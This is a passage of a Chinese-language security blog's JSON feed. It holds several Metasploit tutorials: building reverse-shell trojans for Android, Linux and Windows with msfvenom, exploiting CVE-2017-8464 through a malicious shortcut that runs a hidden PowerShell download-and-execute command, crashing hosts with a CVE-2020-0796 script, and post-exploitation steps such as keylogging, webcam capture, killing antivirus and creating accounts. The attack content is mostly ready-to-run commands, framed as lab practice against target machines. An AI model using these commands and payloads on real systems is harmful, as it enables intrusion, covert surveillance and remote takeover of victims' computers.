            "date_published": "2023-01-12T13:17:00.000Z",
            "content_html": "<p>一、环境准备</p>\n<p>1 MSF-Metasploit Framework</p>\n<p>2 一台获取到 meterpreter 的靶机</p>\n<p>二、实际操作</p>\n<p>1、先看下目标靶机已存在用户  meterpreter 中输入：run post/windows/gather/enum_logged_on_users</p>\n<p>![1643108073546](22 后渗透之创建账户（Windows）.assets/1643108073546.png)</p>\n<p>2、使用 getgui 创建 一个用户名为 msb  密码为 123456  的账户</p>\n<p>run getgui -u msb -p 123456</p>\n<p 密码>run getgui -u {用户名}-p</p>\n<p>进入 win 的运行输入 netplwiz 可以查看账户创建情况</p>\n<p>![1643108092979](22 后渗透之创建账户（Windows）.assets/1643108092979.png)</p>\n<p>[-] Insufficient privileges, account was not be created. 看到这个提示就需要先提权（获取到 system）</p>\n<p>2.1 绕过 UAC 提权</p>\n<p>use exploit/windows/local/<em>ask</em></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/",
            "title": "后渗透之下载文件屏幕截图键盘记录",
            "date_published": "2023-01-12T13:08:41.000Z",
            "content_html": "<p>第 21 课 ：后渗透之上传下载文件</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">ID</th>\n<th>Command</th>\n<th style=\"text-align:center\">Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td>upload</td>\n<td style=\"text-align:center\">传文件到靶机</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td>download</td>\n<td style=\"text-align:center\">从靶机下载文件</td>\n</tr>\n</tbody>\n</table>\n<p>第 22 课：后渗透之屏幕截图</p>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>screenshot</td>\n<td>截图（Windows）</td>\n</tr>\n</tbody>\n</table>\n<p>第 23 课：后渗透之键盘记录</p>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>Conmmand</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>keyscan_start</td>\n<td>启动键盘记录 (Windows)</td>\n</tr>\n<tr>\n<td>2</td>\n<td>keyscan_dump</td>\n<td>导出键盘 (Windows)</td>\n</tr>\n<tr>\n<td>3</td>\n<td>keyscan_stop</td>\n<td>停止键盘记录 (Windows)</td>\n</tr>\n</tbody>\n</table>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/",
            "title": "后渗透之访问文件系统",
            "date_published": "2023-01-12T13:05:24.000Z",
            "content_html": "<h1 id=\"一-后渗透之访问文件系统\"><a class=\"anchor\" href=\"#一-后渗透之访问文件系统\">#</a> 一、后渗透之访问文件系统</h1>\n<p>1. 文件交互指令</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">ID</th>\n<th style=\"text-align:left\">Command</th>\n<th style=\"text-align:left\">Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:left\">cat</td>\n<td style=\"text-align:left\">读取文件内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:left\">cd</td>\n<td style=\"text-align:left\">切换靶机目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:left\">cp</td>\n<td style=\"text-align:left\">复制文件到目标</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">4</td>\n<td style=\"text-align:left\">mv</td>\n<td style=\"text-align:left\">移动到目标</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">5</td>\n<td style=\"text-align:left\">chmod</td>\n<td style=\"text-align:left\">修改文件权限（比如 chmod 777 shell.elf）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">6</td>\n<td style=\"text-align:left\">del / rm</td>\n<td style=\"text-align:left\">删除靶机文件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">7</td>\n<td style=\"text-align:left\">dir</td>\n<td style=\"text-align:left\">打印靶机目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">8</td>\n<td style=\"text-align:left\">mkdir</td>\n<td style=\"text-align:left\">在靶机上创建目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">9</td>\n<td style=\"text-align:left\">rmdir</td>\n<td style=\"text-align:left\">删除靶机目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">10</td>\n<td style=\"text-align:left\">edit</td>\n<td style=\"text-align:left\">编辑文件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">11</td>\n<td style=\"text-align:left\">getlwd</td>\n<td style=\"text-align:left\">打印本地目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">12</td>\n<td style=\"text-align:left\">getwd</td>\n<td style=\"text-align:left\">打印靶机目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">13</td>\n<td style=\"text-align:left\">lcd</td>\n<td style=\"text-align:left\">更改本地目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">14</td>\n<td style=\"text-align:left\">lls</td>\n<td style=\"text-align:left\">列出本地目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">15</td>\n<td style=\"text-align:left\">ls</td>\n<td style=\"text-align:left\">列出靶机文件目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">16</td>\n<td style=\"text-align:left\">lpwd</td>\n<td style=\"text-align:left\">打印本地目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">17</td>\n<td style=\"text-align:left\">pwd</td>\n<td style=\"text-align:left\">打印工作目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">19</td>\n<td style=\"text-align:left\">search</td>\n<td style=\"text-align:left\">搜索文件 详情 search -h</td>\n</tr>\n</tbody>\n</table>\n<p>Linux 权限理解</p>\n<p 文件名.后缀>chmod  777  </p>\n<p>chmod  777    shell.elf</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Android/",
            "url": "https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Android/",
            "title": "生成木马反弹shell_Android",
            "date_published": "2023-01-12T08:04:52.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、环境准备</h1>\n<ol>\n<li>MSF-Metasploit Framework</li>\n<li>一台安装手机或者模拟器</li>\n</ol>\n<h1 id=\"二-木马生成\"><a class=\"anchor\" href=\"#二-木马生成\">#</a> 二、木马生成</h1>\n<ol>\n<li>生成一个 APK 后门</li>\n<li>msfvenom -p android/meterpreter/reverse_tcp LHOST={监控 IP} LPORT={监控端口} R&gt;k.apk。</li>\n</ol>\n<p>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.38  LPORT=4567 R&gt;k.apk</p>\n<h1 id=\"三-配置监控\"><a class=\"anchor\" href=\"#三-配置监控\">#</a> 三、配置监控</h1>\n<ol>\n<li>\n<p>启动 msf   终端内输入：msfconsole 启动 msf![1643003592876](21 通过木马反弹 shell（Android）.assets/1643003592876.png)</p>\n</li>\n<li>\n<p>载入监控模块  msf 中输入：  use exploit/multi/handler</p>\n</li>\n<li>\n<p>载入 payload MSF 终端中输入： set payload android/meterpreter/reverse_tcp</p>\n<p>![1643003612323](21 通过木马反弹 shell（Android）.assets/1643003612323.png)</p>\n</li>\n<li>\n<p>配置 payload  MSF 终端中输入：show options</p>\n</li>\n<li>\n<p>配置监控 IP MSF 中输入：set lhost  &lt;监控的 IP&gt;</p>\n</li>\n<li>\n<p>配置监控端口  MSF 中输入：set lporr  &lt;监控的端口&gt;</p>\n</li>\n<li>\n<p>执行监控  msf 终端中输入： run![1643003633911](21 通过木马反弹 shell（Android）.assets/1643003633911.png)</p>\n</li>\n</ol>\n<h1 id=\"四-攻击利用\"><a class=\"anchor\" href=\"#四-攻击利用\">#</a> 四、攻击利用</h1>\n<ol>\n<li>将木马上传到靶机</li>\n<li>在靶机上执行木马</li>\n<li>完成攻击利用！[1643003654523](21 通过木马反弹 shell（Android）.assets/1643003654523.png)</li>\n</ol>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Linux/",
            "url": "https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Linux/",
            "title": "生成木马反弹shell_Linux",
            "date_published": "2023-01-12T08:03:27.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、环境准备</h1>\n<ol>\n<li>MSF-Metasploit Framework</li>\n<li>一台靶机</li>\n</ol>\n<h1 id=\"二-木马生成\"><a class=\"anchor\" href=\"#二-木马生成\">#</a> 二、木马生成</h1>\n<ol>\n<li>生成一个 Linux 后门</li>\n<li>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={监控 IP} LPORT={监控端口} -f elf &gt; shell.elf!![1643108165465](22 通过木马反弹 shell（Linux）.assets/1643108165465.png)</li>\n</ol>\n<h1 id=\"三-配置监控\"><a class=\"anchor\" href=\"#三-配置监控\">#</a> 三、配置监控</h1>\n<ol>\n<li>\n<p>启动 msf   终端内输入：msfconsole 启动 msf</p>\n<p>![1643108186343](22 通过木马反弹 shell（Linux）.assets/1643108186343.png)</p>\n</li>\n<li>\n<p>载入监控模块  msf 中输入：  use exploit/multi/handler</p>\n</li>\n<li>\n<p>加载 payload  msf 终端中输入：set payload linux/x64/meterpreter/reverse_tcp</p>\n</li>\n<li>\n<p>配置 payload  msf 终端中输入：show options</p>\n<p>![1643108202630](22 通过木马反弹 shell（Linux）.assets/1643108202630.png)</p>\n</li>\n<li 监控ip>\n<p>配置 payload 监控 IP msf 终端中输入： set  lhost </p>\n</li>\n<li>\n<p>配置 payload 监控端口  msf 终端中输入：set lport  {监控端口} （注意这里要和木马配置时使用的端口相同 &amp; 如果使用内网穿透服务填写转发后的端口）</p>\n</li>\n<li>\n<p>检查 payload 配置  msf 终端中输入：show options</p>\n</li>\n<li>\n<p>执行监控  msf 终端中输入： run</p>\n<p>![1643108218621](22 通过木马反弹 shell（Linux）.assets/1643108218621.png)</p>\n</li>\n</ol>\n<h1 id=\"四-攻击利用\"><a class=\"anchor\" href=\"#四-攻击利用\">#</a> 四、攻击利用</h1>\n<ol>\n<li>\n<p>将木马上传到靶机</p>\n<p>通过 python 创建一个简单 web 服务</p>\n<p>python2 -m SimpleHTTPServer 80</p>\n</li>\n<li>\n<p>在靶机上执行木马</p>\n</li>\n<li>\n<p>完成攻击利用</p>\n<p>![1643108263211](22 通过木马反弹 shell（Linux）.assets/1643108263211.png)</p>\n</li>\n</ol>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Windows/",
            "title": "生成木马反弹shell_Windows",
            "date_published": "2023-01-12T07:49:18.000Z",
            "content_html": "<p>生成木马反弹 shell（Windows）</p>\n<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、环境准备</h1>\n<ol>\n<li>MSF-Metasploit Framework</li>\n<li>一台 windiows 靶机</li>\n</ol>\n<h1 id=\"二-开始生成木马\"><a class=\"anchor\" href=\"#二-开始生成木马\">#</a> 二、开始生成木马</h1>\n<ol>\n<li>使用 msfvenom 生成木马</li>\n<li>终端内输入:   msfvenom -p windows/meterpreter_reverse_tcp LHOST={监控 IP} LPORT={监控端口} -e x86/shikata_ga_nai  -f exe -o  new.exe -i 5</li>\n</ol>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.38  LPORT=4567  -e x86/shikata_ga_nai  -f exe -o  shell.exe  -i 5</p>\n<h1 id=\"三-配置监控\"><a class=\"anchor\" href=\"#三-配置监控\">#</a> 三、配置监控</h1>\n<ol>\n<li>\n<p>启动 msf   终端内输入：msfconsole 启动 msf<img data-src=\"%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501758409.png\" alt=\"1642501758409\"></p>\n</li>\n<li>\n<p>载入监控模块  msf 中输入： use exploit/multi/handler</p>\n<p><img data-src=\"%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501831818.png\" alt=\"1642501831818\"></p>\n</li>\n<li>\n<p>加载 payload  msf 终端中输入：set payload windows/meterpreter/reverse_tcp</p>\n</li>\n<li>\n<p>配置 payload  msf 终端中输入：show options</p>\n</li>\n<li 监控ip>\n<p>配置 payload 监控 IP msf 终端中输入： set  lhost </p>\n</li>\n<li>\n<p>配置 payload 监控端口  msf 终端中输入：set lport  {监控端口} （注意这里要和木马配置时使用的端口相同 &amp; 如果使用内网穿透服务填写转发后的端口）</p>\n</li>\n<li>\n<p>检查 payload 配置  msf 终端中输入：show options <img data-src=\"%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501934250.png\" alt=\"1642501934250\"></p>\n</li>\n<li>\n<p>执行监控  msf 终端中输入： run</p>\n</li>\n</ol>\n<h1 id=\"四-攻击利用\"><a class=\"anchor\" href=\"#四-攻击利用\">#</a> 四、攻击利用</h1>\n<ol>\n<li>将木马上传到靶机</li>\n<li>在靶机上执行木马</li>\n<li>完成攻击利用<img data-src=\"%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501969373.png\" alt=\"1642501969373\"></li>\n</ol>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/",
            "url": "https://mangpumo.github.io/2023/01/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/",
            "title": "永恒之黑漏洞利用",
            "date_published": "2023-01-12T07:37:55.000Z",
            "content_html": "<h1 id=\"一-cve-2020-0796-永恒之黑漏洞\"><a class=\"anchor\" href=\"#一-cve-2020-0796-永恒之黑漏洞\">#</a> 一、 CVE-2020-0796 永恒之黑漏洞</h1>\n<p>永恒之黑漏洞与 “永恒之蓝” 漏洞极为相似，都是利用 Windows SMB 漏洞远程攻击获取系统最高权限。</p>\n<p><strong>漏洞危害等级：高危</strong></p>\n<p>“永恒之黑” 漏洞高危之处在于对 SMB 客户端的攻击，攻击者可以通过构造一个 “特制” 的网页、压缩包、共享目录、OFFICE 文档等，向攻击目标发送，一旦被攻击者打开则瞬间触发漏洞受到攻击。</p>\n<p>漏洞成因：<br>\nCVE-2020-0796 漏洞存在于受影响版本的 Windows 驱动 srv2.sys 中，由于 Windows SMB 更新到 3.1.1 版本增加了对压缩数据的支持，未对用户传输的压缩数据的合法性进行校验。</p>\n<p>受影响的 Windows 版本</p>\n<p>Windows 10 Version 1903 for 32-bit Systems<br>\nWindows 10 Version 1903 for ARM64-based Systems<br>\nWindows 10 Version 1903 for x64-based Systems<br>\nWindows 10 Version 1909 for 32-bit Systems<br>\nWindows 10 Version 1909 for ARM64-based Systems<br>\nWindows 10 Version 1909 for x64-based Systems<br>\nWindows Server, version 1903 (Server Core installation)<br>\nWindows Server, version 1909 (Server Core installation)</p>\n<h1 id=\"二-环境准备\"><a class=\"anchor\" href=\"#二-环境准备\">#</a> 二、环境准备</h1>\n<p>1 一个受影响的 windows 版本</p>\n<p>2  正常的电脑</p>\n<h1 id=\"三-开始利用\"><a class=\"anchor\" href=\"#三-开始利用\">#</a> 三、开始利用</h1>\n<p>首先确认当前作为靶机的 Windows 系统是受影响的版本</p>\n<p>Windows 版本，按 win+r，在弹出运行窗口中，输入 winver</p>\n<p>![1642062038435](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062038435.png)</p>\n<h2 id=\"1-漏洞发现\"><a class=\"anchor\" href=\"#1-漏洞发现\">#</a> 1、 漏洞发现</h2>\n<p>![1642062059301](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062059301.png)</p>\n<p>使用奇安信的漏洞探测工具</p>\n<p>直接在 cmd 中启动  CVE-2020-0796-Scanner.exe</p>\n<p>根据提示输入扫描目标 IP 或者扫描 IP 范围</p>\n<p>![1642062077901](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062077901.png)</p>\n<h2 id=\"2-准备蓝屏payload\"><a class=\"anchor\" href=\"#2-准备蓝屏payload\">#</a> 2、准备蓝屏 payload</h2>\n<p>![1642062098119](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062098119.png)</p>\n<p>使用 CVE-2020-0796 蓝屏工具进行攻击</p>\n<p>python3 <span class=\"exturl\" data-url=\"aHR0cDovL0NWRS0yMDIwLTA3OTYucHk=\">CVE-2020-0796.py</span>  <code>&lt;查询到存在漏洞的IP&gt;</code></p>\n<p>python3 <span class=\"exturl\" data-url=\"aHR0cDovL0NWRS0yMDIwLTA3OTYucHk=\">CVE-2020-0796.py</span>  192.168.3.38</p>\n<p>如果靶机没有蓝屏就重新攻击一下</p>\n<p>![1642062112224](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062112224.png)</p>\n<p>扩展阅读：</p>\n<p>微软披露了一个最新的 SMBv3 (3.1.1) 远程代码执行漏洞 (CVE-2020-0796)，俗称 “永恒之黑”。本漏洞源于 SMBv3 没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。利用该漏洞，攻击方可直接远程攻击 SMB 服务端远程执行任意恶意代码，亦可通过构建恶意 SMB 服务端诱导客户端连接从而大规模攻击客户端。永恒之黑一旦被成功利用，其危害不亚于永恒之蓝。</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E9%9C%87%E7%BD%91%E4%B8%89%E4%BB%A3%E5%8F%8D%E5%BC%B9shell/",
            "url": "https://mangpumo.github.io/2023/01/12/%E9%9C%87%E7%BD%91%E4%B8%89%E4%BB%A3%E5%8F%8D%E5%BC%B9shell/",
            "title": "震网三代反弹shell",
            "date_published": "2023-01-12T07:30:47.000Z",
            "content_html": "<h1 id=\"一-什么是-cve-2017-8464\"><a class=\"anchor\" href=\"#一-什么是-cve-2017-8464\">#</a> 一、 什么是 CVE-2017-8464：</h1>\n<p>说明：</p>\n<p>2017 年 6 月 13 日，微软官方发布编号为 CVE-2017-8464 的漏洞公告，官方介绍 Windows 系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过 U 盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危</p>\n<p>传播的载体一般是 LNK ，LNK 是 windows 系统内应用程序快捷方式文件的文件类型后缀名。</p>\n<p>危害：</p>\n<p>被攻击机插入存在攻击 lnk 的 U 盘后会反弹 shell，哪怕是被隔离的内网，也可以在不上网的情况下被攻击。</p>\n<h1 id=\"二-环境准备\"><a class=\"anchor\" href=\"#二-环境准备\">#</a> 二、环境准备：</h1>\n<p>1 可复现的操作系统版本：</p>\n<ul>\n<li>Microsoft Windows 10 Version 1607 for 32-bit Systems</li>\n<li>Microsoft Windows 10 Version 1607 for x64-based Systems</li>\n<li>Microsoft Windows 10 for 32-bit Systems</li>\n<li>Microsoft Windows 10 for x64-based Systems</li>\n<li>Microsoft Windows 10 version 1511 for 32-bit Systems</li>\n<li>Microsoft Windows 10 version 1511 for x64-based Systems</li>\n<li>Microsoft Windows 10 version 1703 for 32-bit Systems</li>\n<li>Microsoft Windows 10 version 1703 for x64-based Systems</li>\n<li>Microsoft Windows 7 for 32-bit Systems SP1</li>\n<li>Microsoft Windows 7 for x64-based Systems SP1</li>\n<li>Microsoft Windows 8.1 for 32-bit Systems</li>\n<li>Microsoft Windows 8.1 for x64-based Systems</li>\n<li>Microsoft Windows RT 8.1</li>\n</ul>\n<p>2 可复现的服务器系统版本：</p>\n<ul>\n<li>Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1</li>\n<li>Microsoft Windows Server 2008 R2 for x64-based Systems SP1</li>\n<li>Microsoft Windows Server 2008 for 32-bit Systems SP2</li>\n<li>Microsoft Windows Server 2008 for Itanium-based Systems SP2</li>\n<li>Microsoft Windows Server 2008 for x64-based Systems SP2</li>\n<li>Microsoft Windows Server 2012</li>\n<li>Microsoft Windows Server 2012 R2</li>\n<li>Microsoft Windows Server 2016</li>\n</ul>\n<p>3 kali 操作系统</p>\n<h1 id=\"三-利用原理\"><a class=\"anchor\" href=\"#三-利用原理\">#</a> <strong>三、利用原理</strong> ：</h1>\n<p>创建恶意快捷方式，包含恶意执行脚本，点击恶意快捷方式，导致本机中病毒，并且被远控。</p>\n<h1 id=\"四-实战利用\"><a class=\"anchor\" href=\"#四-实战利用\">#</a> 四、实战利用</h1>\n<p>启动 MSF</p>\n<p>终端内输入：msfconsole</p>\n<p>开始利用：</p>\n<h4 id=\"1-使用msf创建一个后门\"><a class=\"anchor\" href=\"#1-使用msf创建一个后门\">#</a> 1、使用 MSF 创建一个后门</h4>\n<p>msf 内输入：</p>\n<p>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.3.23 lport=4456 -f psh-reflection&gt;/var/www/html/link.ps1</p>\n<h4 id=\"2-在kali下开启apache2\"><a class=\"anchor\" href=\"#2-在kali下开启apache2\">#</a> 2、在 kali 下开启 apache2</h4>\n<p>终端内输入：service apache2 start</p>\n<h4 id=\"3-通过社会学进行快捷方式传播\"><a class=\"anchor\" href=\"#3-通过社会学进行快捷方式传播\">#</a> 3、通过社会学进行快捷方式传播</h4>\n<p>powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMjA0LjEzNS9saW5rLnBzMQ==\">http://192.168.204.135/link.ps1</span>');test.ps1&quot;</p>\n<p>![1641972171811](一、 什么是 CVE-2017-8464：.assets/1641972171811.png)</p>\n<p>![1641972183309](一、 什么是 CVE-2017-8464：.assets/1641972183309.png)</p>\n<h4 id=\"4-回到msf终端配置监听\"><a class=\"anchor\" href=\"#4-回到msf终端配置监听\">#</a> 4 回到 MSF 终端配置监听</h4>\n<p>msf 内输入：  use exploit/multi/handler</p>\n<h4 id=\"5-配置payload\"><a class=\"anchor\" href=\"#5-配置payload\">#</a> 5 配置 payload</h4>\n<p>set payload windows/x64/meterpreter/reverse_tcp</p>\n<p>![1641972198597](一、 什么是 CVE-2017-8464：.assets/1641972198597.png)</p>\n<p>msf 中输入 ： show options   配置 payload</p>\n<p>![1641972211876](一、 什么是 CVE-2017-8464：.assets/1641972211876.png)</p>\n<p>设置 LHOST  和  LPORT</p>\n<p>maf 中输入：</p>\n<p>5.1  set lhost  <code>&lt;当前机器ip&gt;</code>  设置 LHOST</p>\n<p>5.2  set lport   <code>&lt;未被占用的端口&gt;</code>   设置 LPORT</p>\n<p>![1641972223277](一、 什么是 CVE-2017-8464：.assets/1641972223277.png)</p>\n<p>5.3  最后在 输入 show options 查看配置是否生效</p>\n<p>![1641972233527](一、 什么是 CVE-2017-8464：.assets/1641972233527.png)</p>\n<h4 id=\"6-执行监听\"><a class=\"anchor\" href=\"#6-执行监听\">#</a> 6、执行监听</h4>\n<p>msf 中输入 ： run 或者  exploit</p>\n<p>![1641972244295](一、 什么是 CVE-2017-8464：.assets/1641972244295.png)</p>\n<p>进入靶机执行我们在靶机上创建的快捷方式</p>\n<p>![1641972183309](一、 什么是 CVE-2017-8464：.assets/1641972183309.png)</p>\n<p>稍等片刻获取到 meterpreter</p>\n<p>![1641972268406](一、 什么是 CVE-2017-8464：.assets/1641972268406.png)</p>\n<h1 id=\"五-后渗透\"><a class=\"anchor\" href=\"#五-后渗透\">#</a> 五、后渗透</h1>\n<p>1、通过快捷方式执行程序</p>\n<p>meterpreter 中输入  shell</p>\n<p>![1641972283719](一、 什么是 CVE-2017-8464：.assets/1641972283719.png)</p>\n<p>发现 shell 显示有乱码</p>\n<p>shell 内输入  chcp 65001</p>\n<p>![1641972295944](一、 什么是 CVE-2017-8464：.assets/1641972295944.png)</p>\n<p>然后进入 desktop 目录（这个是 win 的桌面）</p>\n<p>根据实际情况拼路径</p>\n<p>shell 里输入：cd users/mb/desktop</p>\n<p>![1641972307789](一、 什么是 CVE-2017-8464：.assets/1641972307789.png)</p>\n<p>2 更多操作</p>\n<p>查看进程：ps<br>\n 查看当前进程号：getpid<br>\n 查看系统信息：sysinfo<br>\n 查看目标机是否为虚拟机：run post/windows/gather/checkvm<br>\n 查看完整网络设置：route<br>\n 查看当前权限：getuid<br>\n 自动提权：getsystem<br>\n 关闭杀毒软件：run post/windows/manage/killav<br>\n 启动远程桌面协议：run post/windows/manage/enable_rdp<br>\n 列举当前登录的用户：run post/windows/gather/enum_logged_on_users<br>\n 查看当前应用程序：run post/windows/gather/enum_applications<br>\n 抓取目标机的屏幕截图：load espia ； screengrab<br>\n 抓取摄像头的照片：webcam_snap<br>\n 查看当前处于目标机的那个目录：pwd<br>\n 查看当前目录：getlwd</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/2017%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/",
            "url": "https://mangpumo.github.io/2023/01/12/2017%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/",
            "title": "2017永恒之蓝漏洞利用",
            "date_published": "2023-01-12T07:19:32.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> <strong>一、 环境准备</strong></h1>\n<p>1 一台 Windows 电脑</p>\n<p>（可以使用虚拟机代替）</p>\n<h3 id=\"2-metasploit任意平台\"><a class=\"anchor\" href=\"#2-metasploit任意平台\">#</a> 2 Metasploit 任意平台</h3>\n<p>可以是 Windows 版，可以是 kali 自带版</p>\n<h1 id=\"二-cve-2017-0144-介绍\"><a class=\"anchor\" href=\"#二-cve-2017-0144-介绍\">#</a> <strong>二、</strong> CVE-2017-0144 介绍</h1>\n<p>1. 何为 CVE-2017-0144？</p>\n<p>​    CVE-2017-0144 既 永恒之蓝最早爆发于 2017 年 4 月 14 日晚，是一种利用 Windows 系统的 SMB 协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于 2017 年 5 月 12 日， 不法分子通过改造 “永恒之蓝” 制作了勒索病毒，使全世界大范围内遭受了勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。</p>\n<p>2. 什么是 SMB 协议？</p>\n<p>SMB 是一个协议服务器信息块，它是一种客户机 / 服务器、请求 / 响应协议，通过 SMB 协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠 SMB 实现的；SMB 协议工作在应用层和会话层，可以用在 TCP/IP 协议之上，SMB 使用 TCP139 端口和 TCP445 端口。</p>\n<p>3.SMB 工作原理是什么？</p>\n<p>（1）：首先客户端发送一个 SMB negport 请求数据报，，并列出它所支持的所有 SMB 的协议版本。服务器收到请求消息后响应请求，并列出希望使用的 SMB 协议版本。如果没有可以使用的协议版本则返回 0XFFFFH，结束通信。</p>\n<p>（2）：协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送 SessetupX 请求数据包实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个 SessetupX 应答数据包来允许或拒绝本次连接。</p>\n<p>（3）：当客户端和服务器完成了磋商和认证之后，它会发送一个 Tcon 或 TconX SMB 数据报并列出它想访问的网络资源的名称，之后会发送一个 TconX 应答数据报以表示此次连接是否接收或拒绝。</p>\n<p>（4）：连接到相应资源后，SMB 客户端就能够通过 open SMB 打开一个文件，通过 read SMB 读取文件，通过 write SMB 写入文件，通过 close SMB 关闭文件。</p>\n<h1 